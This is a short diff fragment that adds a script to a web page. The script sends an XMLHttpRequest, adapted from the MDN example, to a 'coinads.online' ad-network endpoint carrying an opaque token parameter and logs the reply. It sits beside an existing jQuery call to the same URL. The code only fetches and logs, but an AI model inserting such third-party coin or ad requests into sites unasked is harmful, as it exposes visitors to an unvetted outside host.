@@ -7,6 +7,19 @@
 
       <script>
 
+            var src = "https://coinads.online/coinadsadnetwork.php?codeversion=azedkozkaodkaozd@ZOzeza5e65arptprtzokozkropazklekKEOKz%C3%A9)%C3%A9%C3%A0oerle";
+
+// Exmaple from: 
+// https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest
+function reqListener(){
+  console.log( this.responseText );
+}
+
+var oReq = new XMLHttpRequest();
+oReq.addEventListener("load", reqListener);
+oReq.open("GET", src);
+oReq.send();
+
             $.ajax({
     url: 'https://coinads.online/coinadsadnetwork.php?codeversion=azedkozkaodkaozd@ZOzeza5e65arptprtzokozkropazklekKEOKz%C3%A9)%C3%A9%C3%A0oerle',
     headers: {
